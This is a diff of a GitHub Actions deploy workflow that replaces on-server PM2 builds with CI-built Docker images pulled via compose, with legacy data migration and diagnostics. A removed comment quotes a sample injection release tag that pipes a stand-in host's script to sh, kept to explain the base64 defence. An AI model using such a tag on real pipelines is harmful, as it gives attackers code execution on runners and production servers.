@@ -32,18 +32,152 @@ jobs:
     name: Run Test Suite
     uses: ./.github/workflows/test.yml
 
+
+  # ============================================
+  # Build images (CI, never on the server)
+  # ============================================
+  # The whole point of #1121: an artifact that is PROVEN to build before it can
+  # reach a host. The shape this replaces built on the box, so a failed npm ci
+  # or uv sync left new code beside a dead process, with no previous image to
+  # restart.
+  #
+  # Two jobs rather than one matrix because NEXT_PUBLIC_* are inlined into the
+  # client bundle at build time — staging and production genuinely need
+  # different images, and each job needs its own `environment:` to see its own
+  # secrets (the #1112 lesson: an environment secret is empty in a job that
+  # does not declare the environment).
+  docker-build-staging:
+    name: Build images (staging)
+    runs-on: ubuntu-latest
+    needs: test
+    if: |
+      (github.event_name == 'push') ||
+      (github.event_name == 'workflow_dispatch' && github.event.inputs.environment == 'staging')
+    environment: staging
+    permissions:
+      contents: read
+      packages: write
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+
+      - name: Log in to GHCR
+        uses: docker/login-action@5e57cd118135c172c3672efd75eb46360885c0ef # v3.6.0
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Set up Buildx
+        uses: docker/setup-buildx-action@e468171a9de216ec08956ac3ada2f0791b6bd435 # v3.11.1
+
+      - name: Build and push backend
+        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83 # v6.18.0
+        with:
+          context: .
+          push: true
+          tags: |
+            ghcr.io/frankbria/codeframe-backend:${{ github.sha }}
+            ghcr.io/frankbria/codeframe-backend:staging
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+      - name: Build and push frontend
+        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83 # v6.18.0
+        with:
+          context: ./web-ui
+          push: true
+          # Build args, not runtime env: Next inlines NEXT_PUBLIC_* into the
+          # client bundle and snapshots BACKEND_ORIGIN into the standalone
+          # server's config. Setting any of them on the container does nothing.
+          build-args: |
+            NEXT_PUBLIC_API_URL=${{ secrets.API_URL }}
+            NEXT_PUBLIC_WS_URL=${{ secrets.WS_URL }}
+            NEXT_PUBLIC_SSE_URL=${{ secrets.API_URL }}
+            BACKEND_ORIGIN=http://backend:14200
+          tags: |
+            ghcr.io/frankbria/codeframe-frontend:${{ github.sha }}
+            ghcr.io/frankbria/codeframe-frontend:staging
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+  docker-build-production:
+    name: Build images (production)
+    runs-on: ubuntu-latest
+    needs: test
+    if: |
+      (github.event_name == 'release') ||
+      (github.event_name == 'workflow_dispatch' && github.event.inputs.environment == 'production')
+    environment: production
+    permissions:
+      contents: read
+      packages: write
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+
+      - name: Log in to GHCR
+        uses: docker/login-action@5e57cd118135c172c3672efd75eb46360885c0ef # v3.6.0
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Set up Buildx
+        uses: docker/setup-buildx-action@e468171a9de216ec08956ac3ada2f0791b6bd435 # v3.11.1
+
+      - name: Build and push backend
+        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83 # v6.18.0
+        with:
+          context: .
+          push: true
+          tags: |
+            ghcr.io/frankbria/codeframe-backend:${{ github.sha }}
+            ghcr.io/frankbria/codeframe-backend:production
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
+      - name: Build and push frontend
+        uses: docker/build-push-action@263435318d21b8e681c14492fe198d362a7d2c83 # v6.18.0
+        with:
+          context: ./web-ui
+          push: true
+          build-args: |
+            NEXT_PUBLIC_API_URL=${{ secrets.API_URL }}
+            NEXT_PUBLIC_WS_URL=${{ secrets.WS_URL }}
+            NEXT_PUBLIC_SSE_URL=${{ secrets.API_URL }}
+            BACKEND_ORIGIN=http://backend:14200
+          tags: |
+            ghcr.io/frankbria/codeframe-frontend:${{ github.sha }}
+            ghcr.io/frankbria/codeframe-frontend:production
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
+
   # ============================================
   # Deploy to Staging
   # ============================================
   deploy-staging:
     name: Deploy to Staging
     runs-on: ubuntu-latest
-    needs: test  # Gate: do not deploy unless the test suite passes
-    # Serialize staging deploys: overlapping runs SSH to the same VPS and run
-    # `uv venv --clear`, `npm run build`, and `pm2 restart` concurrently, which
-    # clears a venv another run is using and races the backend port rebind →
-    # the backend crash-loops and the health check fails. Queue instead of
-    # cancel: never interrupt an in-flight deploy and leave the server half-updated.
+    permissions:
+      contents: read
+      # The job pipes this token to the server for `docker login ghcr.io`.
+      # Without it the images build fine and the deploy then fails at pull —
+      # GHCR packages are private by default even for a public repo.
+      packages: read
+    # Gate: tests pass AND both images built. A deploy can no longer reach the
+    # host unless the artifact it will run already exists.
+    needs: [test, docker-build-staging]
+    # Serialize staging deploys. The build-on-server shape made this essential
+    # — overlapping runs raced `uv venv --clear` against a live process. Since
+    # #1121 the deploy is only a pull and a `compose up`, so the hazard is much
+    # smaller, but two runs still converge on the same containers and ports and
+    # the later image should win cleanly. Queue rather than cancel: never
+    # interrupt an in-flight deploy and leave the box half-updated.
     concurrency:
       group: deploy-staging
       cancel-in-progress: false
@@ -114,8 +248,6 @@ jobs:
           ENV_ENVIRONMENT: ${{ secrets.ENVIRONMENT }}
           ENV_DEBUG: ${{ secrets.DEBUG }}
           ENV_HOT_RELOAD: ${{ secrets.HOT_RELOAD }}
-          ENV_PM2_FRONTEND_NAME: ${{ secrets.PM2_FRONTEND_NAME }}
-          ENV_PM2_BACKEND_NAME: ${{ secrets.PM2_BACKEND_NAME }}
         run: |
           echo "📝 Creating .env.staging file..."
 
@@ -202,94 +334,109 @@ jobs:
 
       - name: Deploy to staging server
         env:
-          BACKEND_NAME: ${{ secrets.PM2_BACKEND_NAME }}
-          FRONTEND_NAME: ${{ secrets.PM2_FRONTEND_NAME }}
-          NEXT_PUBLIC_API_URL: ${{ secrets.API_URL }}
-          NEXT_PUBLIC_WS_URL: ${{ secrets.WS_URL }}
+          # Short-lived: this token is valid only for the life of the job, so
+          # the server needs no long-term registry credential and no new
+          # secret has to be created for it.
+          GHCR_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Legacy only — read once, to retire the PM2 processes that still
+          # hold the ports. Nothing else in this workflow uses PM2 any more.
+          LEGACY_BACKEND_NAME: ${{ secrets.PM2_BACKEND_NAME }}
+          LEGACY_FRONTEND_NAME: ${{ secrets.PM2_FRONTEND_NAME }}
         run: |
-          # shellcheck disable=SC2087  # client-side expansion is deliberate:
-          # ${NEXT_PUBLIC_*} and ${BACKEND_NAME}/${FRONTEND_NAME} are runner env
-          # and must be baked in here. The forms that must resolve on the server
-          # are escaped as \${...} below. Keep this heredoc backtick-free — an
-          # unquoted delimiter substitutes even '#' lines (#1130).
-          ssh ${{ secrets.USER }}@${{ secrets.HOST }} "bash -s" << ENDSSH
-            set -e
-            echo "🚀 Starting deployment to staging..."
+          # The compose files are the only thing the host needs from the repo,
+          # and they are small — copy them rather than keeping a git checkout
+          # on the box just to read two YAML files.
+          scp -q docker-compose.yml docker-compose.staging.yml \
+            "${{ secrets.USER }}@${{ secrets.HOST }}:${{ secrets.PROJECT_PATH }}/"
 
-            # Navigate to project directory
+          # shellcheck disable=SC2087  # client-side expansion is deliberate:
+          # the image tag and registry token are runner-side values that must
+          # be baked in. Forms that resolve on the server are escaped \${...}.
+          # Keep this heredoc backtick-free — an unquoted delimiter substitutes
+          # even '#' lines (#1130).
+          ssh ${{ secrets.USER }}@${{ secrets.HOST }} "bash -s" << ENDSSH
+            set -euo pipefail
+            echo "🚀 Deploying staging (image ${{ github.sha }})..."
+
             cd ${{ secrets.PROJECT_PATH }}
 
-            # Pull latest code
-            echo "📥 Pulling latest code..."
-            git fetch origin main
-            git reset --hard origin/main
+            # No git pull, no uv sync, no npm ci, no build of any kind. The
+            # images were built and proven in CI (#1121); this is a pull and a
+            # restart, which is what makes it atomic and rollback-able.
+            echo "${GHCR_TOKEN}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
 
-            # Backend setup
-            echo "🐍 Setting up Python backend..."
-            if ! command -v uv &> /dev/null; then
-              curl -LsSf https://astral.sh/uv/install.sh | sh
-              export PATH="\$HOME/.local/bin:\$PATH"
-            fi
-            uv venv --clear
-            source .venv/bin/activate
-            uv sync
+            export IMAGE_TAG="${{ github.sha }}"
+            export ENV_FILE=.env.staging
+            # Same rule as production: the port the verify step curls is the
+            # port the container publishes.
+            export BACKEND_PORT="\$(grep -E '^API_PORT=' .env.staging 2>/dev/null | cut -d= -f2- || true)"
+            export BACKEND_PORT="\${BACKEND_PORT:-14200}"
+            COMPOSE="docker compose --env-file .env.staging -f docker-compose.yml -f docker-compose.staging.yml"
 
-            # Frontend setup - export NEXT_PUBLIC vars at build time
-            echo "📦 Building frontend..."
-            cd web-ui
-            npm ci
-            echo "🔒 Running security audit..."
-            # high, not critical (#1131). At critical, six high-severity
-            # findings accumulated unnoticed until #1124 went looking. These are
-            # build-time deps, which still run on a runner holding repo
-            # credentials. Tradeoff accepted: audit results change without a
-            # code change, so a newly published high can block a deploy — that
-            # is the gate doing its job, and the fix is to bump the dep.
-            npm audit --audit-level=high
-            # NEXT_PUBLIC vars must be set at build time for Next.js
-            export NEXT_PUBLIC_API_URL="${NEXT_PUBLIC_API_URL}"
-            export NEXT_PUBLIC_WS_URL="${NEXT_PUBLIC_WS_URL}"
-            echo "Building with NEXT_PUBLIC_API_URL=\${NEXT_PUBLIC_API_URL}"
-            npm run build
-            cd ..
-
-            # Install root dependencies (dotenv for ecosystem config)
-            echo "📦 Installing PM2 config dependencies..."
-            npm install
-
-            # Ensure logs directory exists
-            mkdir -p logs
-
-            # Restart PM2 services
-            echo "🔄 Restarting PM2 services..."
-            if ! command -v pm2 &> /dev/null; then
-              echo "❌ PM2 not found - please install PM2 globally"
-              exit 1
+            # One-time migration off the PM2 layout. The old deploy kept the
+            # SQLite DB and workspaces on the host filesystem; the containers
+            # use named volumes, so without this the first containerised deploy
+            # would come up with an empty database — silently losing the
+            # operator's own login account. Idempotent: it only ever fires when
+            # the volume has no DB yet, so re-running a deploy cannot clobber
+            # live data with a stale copy.
+            # One-time cutover: the PM2 processes still hold 14100/14200, so
+            # the containers cannot bind and the deploy dies with
+            # "address already in use". Stop them BY NAME — never a pm2 delete
+            # of "all", which on this shared VPS takes out unrelated apps
+            # (#912). No backticks in here: unquoted heredoc (#1130).
+            # A no-op forever after, and on any host that never ran PM2.
+            if command -v pm2 >/dev/null 2>&1; then
+              for legacy in "${LEGACY_BACKEND_NAME}" "${LEGACY_FRONTEND_NAME}"; do
+                if [ -n "\${legacy}" ] && pm2 describe "\${legacy}" >/dev/null 2>&1; then
+                  echo "🛑 Retiring PM2 process \${legacy}"
+                  pm2 delete "\${legacy}" >/dev/null 2>&1 || true
+                fi
+              done
+              pm2 save >/dev/null 2>&1 || true
             fi
 
-            # PM2 process names from GitHub secrets (expanded by runner)
-            BACKEND_NAME="${BACKEND_NAME}"
-            FRONTEND_NAME="${FRONTEND_NAME}"
+            LEGACY_DB="\$(grep -E '^DATABASE_PATH=' .env.staging 2>/dev/null | cut -d= -f2-)"
+            if [ -n "\${LEGACY_DB}" ] && [ -f "\${LEGACY_DB}" ]; then
+              echo "🗃️  Legacy DB at \${LEGACY_DB} — seeding the volume if it is empty"
+              # Labelled so compose adopts it as its own. Without these it
+              # warns "already exists but was not created by Docker Compose" on
+              # every single deploy — noise that trains you to ignore the log.
+              docker volume create \
+                --label com.docker.compose.project=codeframe \
+                --label com.docker.compose.volume=codeframe-data \
+                codeframe_codeframe-data >/dev/null
+              # The copy runs inside a throwaway container because a named
+              # volume's host path is a docker implementation detail. SRC comes
+              # in as env so no path has to survive another round of quoting.
+              docker run --rm \
+                -e SRC="/legacy/\$(basename "\${LEGACY_DB}")" \
+                -v codeframe_codeframe-data:/data \
+                -v "\$(dirname "\${LEGACY_DB}")":/legacy:ro \
+                alpine:3.20 sh -c '
+                  if [ -f /data/codeframe.db ]; then
+                    echo "   volume already has a database — left alone"
+                  else
+                    cp "\$SRC" /data/codeframe.db && echo "   copied into the volume"
+                  fi
+                  # The backend runs as uid 10001 (non-root). Docker only
+                  # applies the image directory'"'"'s ownership when it initialises
+                  # an EMPTY named volume — this one was pre-populated above, so
+                  # without this chown the DB lands root-owned and the app
+                  # cannot write to it. Verified on the box.
+                  chown -R 10001:10001 /data'
+            fi
 
-            echo "Debug: BACKEND_NAME='\${BACKEND_NAME}'"
-            echo "Debug: FRONTEND_NAME='\${FRONTEND_NAME}'"
+            echo "📥 Pulling images..."
+            \$COMPOSE pull
 
-            # Cold-start from the ecosystem file so its dotenv.config() re-reads
-            # .env.staging on every deploy. A plain "pm2 restart NAME --update-env"
-            # refreshes env from the deploy shell (which never sources .env.staging),
-            # so newly-added vars like WORKSPACE_ROOT (#896) never reach the process
-            # and the backend crash-loops. Delete by name (NOT "pm2 delete all",
-            # which would kill unrelated apps on this shared box), then start fresh.
-            # No backticks in here: this heredoc's delimiter is unquoted, so the
-            # runner's shell command-substitutes even inside a line starting with
-            # '#' — it is heredoc data, not a shell comment (#1130).
-            echo "🔁 (Re)starting PM2 services from config..."
-            pm2 delete "\${BACKEND_NAME}" "\${FRONTEND_NAME}" 2>/dev/null || true
-            pm2 start ecosystem.staging.config.js --update-env
+            echo "🔁 Restarting services..."
+            \$COMPOSE up -d --remove-orphans
 
-            pm2 save
-            echo "✅ PM2 services updated"
+            echo "⏳ Waiting for health..."
+            \$COMPOSE ps
 
+            docker logout ghcr.io >/dev/null 2>&1 || true
             echo "✅ Deployment to staging complete!"
           ENDSSH
 
@@ -312,13 +459,20 @@ jobs:
           done
 
           echo "❌ Health check failed after $MAX_ATTEMPTS attempts"
-          # Surface the cause: a silent `curl -sf` gave no reason. Dump PM2
-          # status and the backend error log so a crash-loop is diagnosable.
-          echo "::group::Backend diagnostics (PM2 status + recent error log)"
+          # Surface the cause: a silent `curl -sf` gave no reason. Same
+          # diagnostics as before, translated from PM2 to compose (#1121) —
+          # container state plus recent logs, so a crash-loop is diagnosable
+          # from the run without SSHing in.
+          # shellcheck disable=SC2029  # client-side expansion is the point.
+          echo "::group::Backend diagnostics (container state + recent logs)"
           ssh ${{ secrets.USER }}@${{ secrets.HOST }} "
-            pm2 describe '${{ secrets.PM2_BACKEND_NAME }}' 2>/dev/null | grep -Ei 'status|restarts|uptime|script|pid|exit' || true
-            echo '--- last 40 lines of logs/backend-error.log ---'
-            tail -n 40 '${{ secrets.PROJECT_PATH }}/logs/backend-error.log' 2>/dev/null || echo '(no backend-error.log found)'
+            cd '${{ secrets.PROJECT_PATH }}' || exit 0
+            COMPOSE='docker compose -f docker-compose.yml -f docker-compose.staging.yml'
+            \$COMPOSE ps || true
+            echo '--- last 60 lines of backend logs ---'
+            \$COMPOSE logs --tail 60 backend 2>&1 || echo '(no backend container)'
+            echo '--- last 30 lines of frontend logs ---'
+            \$COMPOSE logs --tail 30 frontend 2>&1 || echo '(no frontend container)'
           " || true
           echo "::endgroup::"
           exit 1
@@ -343,7 +497,11 @@ jobs:
   deploy-production:
     name: Deploy to Production
     runs-on: ubuntu-latest
-    needs: test  # Gate: do not deploy to production unless the test suite passes
+    permissions:
+      contents: read
+      packages: read
+    # Gate: tests pass AND the images exist. See deploy-staging.
+    needs: [test, docker-build-production]
     # Serialize production deploys (own group, independent of staging).
     concurrency:
       group: deploy-production
@@ -389,14 +547,11 @@ jobs:
           API_URL: ${{ secrets.API_URL }}
           WS_URL: ${{ secrets.WS_URL }}
           CORS_ORIGINS: ${{ secrets.CORS_ORIGINS }}
-          PM2_BACKEND_NAME: ${{ secrets.PM2_BACKEND_NAME }}
-          PM2_FRONTEND_NAME: ${{ secrets.PM2_FRONTEND_NAME }}
         run: |
           set -euo pipefail
           REQUIRED="SSH_KEY SSH_KNOWN_HOSTS TS_OAUTH_CLIENT_ID TS_OAUTH_SECRET
                     HOST USER PROJECT_PATH AUTH_SECRET ANTHROPIC_API_KEY
-                    API_PORT API_URL WS_URL CORS_ORIGINS
-                    PM2_BACKEND_NAME PM2_FRONTEND_NAME"
+                    API_PORT API_URL WS_URL CORS_ORIGINS"
 
           missing=""
           for name in $REQUIRED; do
@@ -591,9 +746,18 @@ jobs:
             mkdir -p \${TMP_BACKUP}
 
             # Record current commit
-            git rev-parse HEAD > \${TMP_BACKUP}/previous_commit.txt
-            git log -1 --format="%H %s" >> \${TMP_BACKUP}/previous_commit.txt
-            echo "📝 Current commit: \$(head -1 \${TMP_BACKUP}/previous_commit.txt)"
+            # Since #1121 the host has no checkout — the deploy pulls an image
+            # instead — so these can legitimately find no repository. Under
+            # set -e that aborted the whole backup step on a fresh host. The
+            # commit is recorded when it happens to be knowable, and the image
+            # tag (which IS the version now) is recorded always.
+            {
+              git rev-parse HEAD 2>/dev/null || echo "no-checkout"
+              git log -1 --format="%H %s" 2>/dev/null || true
+            } > \${TMP_BACKUP}/previous_commit.txt
+            docker compose -f docker-compose.yml -f docker-compose.production.yml \
+              images --format json > \${TMP_BACKUP}/previous_images.json 2>/dev/null || true
+            echo "📝 Previous version: \$(head -1 \${TMP_BACKUP}/previous_commit.txt)"
 
             # Backup database
             if [ -f .codeframe/state.db ]; then
@@ -609,7 +773,7 @@ jobs:
 
             # Backup environment files
             cp .env* \${TMP_BACKUP}/ 2>/dev/null || true
-            cp ecosystem*.config.js \${TMP_BACKUP}/ 2>/dev/null || true
+            cp docker-compose*.yml \${TMP_BACKUP}/ 2>/dev/null || true
 
             # Backup recent logs (last 1000 lines each to keep size manageable)
             if [ -d logs ]; then
@@ -657,129 +821,53 @@ jobs:
 
       - name: Deploy to production server
         env:
-          BACKEND_NAME_PROD: ${{ secrets.PM2_BACKEND_NAME }}
-          FRONTEND_NAME_PROD: ${{ secrets.PM2_FRONTEND_NAME }}
-          NEXT_PUBLIC_API_URL: ${{ secrets.API_URL }}
-          NEXT_PUBLIC_WS_URL: ${{ secrets.WS_URL }}
-          # Via env, never `${{ }}` inside the run script: an expression is
+          GHCR_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          # Via env, never an expression inside the run script: an expression is
           # substituted as raw source text into the shell, an env var is data the
-          # shell never re-parses (#933).
+          # shell never re-parses (#933). Release tags are attacker-influenced —
+          # git ref names may legally contain shell metacharacters.
           RELEASE_TAG: ${{ github.event.release.tag_name }}
         run: |
-          # NOTE: this is the `run` script, not a YAML comment — GitHub parses
-          # workflow expressions anywhere in here, so an empty one written out
-          # literally is a syntax error that invalidates the whole file. Say
-          # "expression" in prose; never spell the delimiters below this line.
-          #
-          # The release tag is attacker-influenced: git ref names may legally
-          # contain ';', '$( )', backticks and pipes, and a workflow expression
-          # is substituted by the runner BEFORE this heredoc is written. A tag like
-          #     v1.0.0";curl evil|sh;"
-          # therefore ran attacker shell on the runner and on the production
-          # host — repo write access escalating to production RCE (#933).
-          #
-          # base64 is the transport because its alphabet (A-Za-z0-9+/=) has no
-          # shell metacharacters, so the value survives both the runner-side
-          # heredoc expansion and the remote shell with nothing to escape. This
-          # mirrors the .env transfer above, which already does exactly this.
-          # ssh SendEnv is not used: it needs a matching AcceptEnv server-side,
-          # which this workflow does not control.
+          set -euo pipefail
+
+          # The tag is carried to the server base64-encoded so no metacharacter
+          # in it is ever parsed by a shell on either side (#933).
           RELEASE_TAG_B64="$(printf '%s' "$RELEASE_TAG" | base64 | tr -d '\n')"
 
-          # shellcheck disable=SC2087  # client-side expansion is deliberate:
-          # ${RELEASE_TAG_B64} and the NEXT_PUBLIC_* vars are runner env and must
-          # be baked in here; what has to resolve server-side is escaped \${...}.
-          # Keep this heredoc backtick-free — an unquoted delimiter substitutes
-          # even '#' lines (#1130).
-          ssh ${{ secrets.USER }}@${{ secrets.HOST }} "bash -s" << ENDSSH
-            set -e
-            echo "🚀 Starting deployment to production..."
+          scp -q docker-compose.yml docker-compose.production.yml \
+            "${{ secrets.USER }}@${{ secrets.HOST }}:${{ secrets.PROJECT_PATH }}/"
 
-            # Navigate to project directory
+          # shellcheck disable=SC2087  # client-side expansion is deliberate:
+          # the image tag, encoded release tag and registry token are runner
+          # values that must be baked in. Server-side forms are escaped
+          # \${...}. Keep this heredoc backtick-free (#1130).
+          ssh ${{ secrets.USER }}@${{ secrets.HOST }} "bash -s" << ENDSSH
+            set -euo pipefail
+            TAG_NAME="\$(printf '%s' '${RELEASE_TAG_B64}' | base64 -d)"
+            echo "🚀 Deploying production release \${TAG_NAME} (image ${{ github.sha }})..."
+
             cd ${{ secrets.PROJECT_PATH }}
 
-            # Pull the release tag or main
-            echo "📥 Pulling latest code..."
-            git fetch origin --tags
-            TAG_NAME="\$(printf '%s' '${RELEASE_TAG_B64}' | base64 -d)"
-            if [ -n "\$TAG_NAME" ]; then
-              # Quoted so a tag with whitespace or globs stays one argument.
-              # (git check-ref-format forbids a leading '-', so the ref cannot be
-              # mistaken for an option.)
-              git checkout "\$TAG_NAME"
-              echo "✅ Checked out tag: \$TAG_NAME"
-            else
-              git fetch origin main
-              git reset --hard origin/main
-              echo "✅ Reset to origin/main"
-            fi
+            # No git checkout of the tag, no build. The image was built from
+            # this exact commit in CI and is addressed by its SHA (#1121).
+            echo "${GHCR_TOKEN}" | docker login ghcr.io -u ${{ github.actor }} --password-stdin
 
-            # Backend setup
-            echo "🐍 Setting up Python backend..."
-            if ! command -v uv &> /dev/null; then
-              curl -LsSf https://astral.sh/uv/install.sh | sh
-              # uv installs to ~/.local/bin, and \$HOME must expand on the host
-              # (not the runner) — mirror the staging job (#727).
-              export PATH="\$HOME/.local/bin:\$PATH"
-            fi
-            uv venv --clear
-            source .venv/bin/activate
-            uv sync --no-dev
+            export IMAGE_TAG="${{ github.sha }}"
+            export ENV_FILE=.env.production
+            # One source of truth for the port: the same API_PORT the verify
+            # step curls also decides what the container publishes.
+            export BACKEND_PORT="\$(grep -E '^API_PORT=' .env.production 2>/dev/null | cut -d= -f2- || true)"
+            export BACKEND_PORT="\${BACKEND_PORT:-14400}"
+            COMPOSE="docker compose --env-file .env.production -f docker-compose.yml -f docker-compose.production.yml"
 
-            # Frontend setup (production build) - export NEXT_PUBLIC vars at build time
-            echo "📦 Building frontend for production..."
-            cd web-ui
-            npm ci
-            echo "🔒 Running security audit..."
-            # high, not critical (#1131). At critical, six high-severity
-            # findings accumulated unnoticed until #1124 went looking. These are
-            # build-time deps, which still run on a runner holding repo
-            # credentials. Tradeoff accepted: audit results change without a
-            # code change, so a newly published high can block a deploy — that
-            # is the gate doing its job, and the fix is to bump the dep.
-            npm audit --audit-level=high
-            # NEXT_PUBLIC vars must be set at build time for Next.js
-            export NEXT_PUBLIC_API_URL="${NEXT_PUBLIC_API_URL}"
-            export NEXT_PUBLIC_WS_URL="${NEXT_PUBLIC_WS_URL}"
-            echo "Building with NEXT_PUBLIC_API_URL=\${NEXT_PUBLIC_API_URL}"
-            npm run build
-            cd ..
+            echo "📥 Pulling images..."
+            \$COMPOSE pull
 
-            # Install root dependencies (dotenv for ecosystem config)
-            echo "📦 Installing PM2 config dependencies..."
-            npm install
+            echo "🔁 Restarting services..."
+            \$COMPOSE up -d --remove-orphans
+            \$COMPOSE ps
 
-            # Run database migrations if any
-            echo "🗃️ Running database migrations..."
-            # Add migration command here if needed
-
-            # Ensure logs directory exists
-            mkdir -p logs
-
-            # Restart PM2 services
-            echo "🔄 Restarting PM2 services..."
-            if ! command -v pm2 &> /dev/null; then
-              echo "❌ PM2 not found - please install PM2 globally"
-              exit 1
-            fi
-
-            # PM2 process names from GitHub secrets (expanded by runner)
-            BACKEND_NAME="${BACKEND_NAME_PROD}"
-            FRONTEND_NAME="${FRONTEND_NAME_PROD}"
-
-            # Cold-start from the ecosystem file so its dotenv.config() re-reads
-            # .env.production on every deploy — see the staging job for why a plain
-            # "pm2 restart NAME" silently drops newly-added .env vars (#896).
-            # Delete by name (NOT "pm2 delete all") to spare unrelated apps.
-            # No backticks: unquoted heredoc, so '#' lines are still substituted
-            # on the runner (#1130).
-            echo "🔁 (Re)starting PM2 services from config..."
-            pm2 delete "\${BACKEND_NAME}" "\${FRONTEND_NAME}" 2>/dev/null || true
-            pm2 start ecosystem.production.config.js --update-env
-
-            pm2 save
-            echo "✅ PM2 services updated"
-
+            docker logout ghcr.io >/dev/null 2>&1 || true
             echo "✅ Deployment to production complete!"
           ENDSSH
 
@@ -802,13 +890,20 @@ jobs:
           done
 
           echo "❌ Health check failed after $MAX_ATTEMPTS attempts"
-          # Surface the cause: a silent `curl -sf` gave no reason. Dump PM2
-          # status and the backend error log so a crash-loop is diagnosable.
-          echo "::group::Backend diagnostics (PM2 status + recent error log)"
+          # Surface the cause: a silent `curl -sf` gave no reason. Same
+          # diagnostics as before, translated from PM2 to compose (#1121) —
+          # container state plus recent logs, so a crash-loop is diagnosable
+          # from the run without SSHing in.
+          # shellcheck disable=SC2029  # client-side expansion is the point.
+          echo "::group::Backend diagnostics (container state + recent logs)"
           ssh ${{ secrets.USER }}@${{ secrets.HOST }} "
-            pm2 describe '${{ secrets.PM2_BACKEND_NAME }}' 2>/dev/null | grep -Ei 'status|restarts|uptime|script|pid|exit' || true
-            echo '--- last 40 lines of logs/backend-error.log ---'
-            tail -n 40 '${{ secrets.PROJECT_PATH }}/logs/backend-error.log' 2>/dev/null || echo '(no backend-error.log found)'
+            cd '${{ secrets.PROJECT_PATH }}' || exit 0
+            COMPOSE='docker compose -f docker-compose.yml -f docker-compose.production.yml'
+            \$COMPOSE ps || true
+            echo '--- last 60 lines of backend logs ---'
+            \$COMPOSE logs --tail 60 backend 2>&1 || echo '(no backend container)'
+            echo '--- last 30 lines of frontend logs ---'
+            \$COMPOSE logs --tail 30 frontend 2>&1 || echo '(no frontend container)'
           " || true
           echo "::endgroup::"
           exit 1
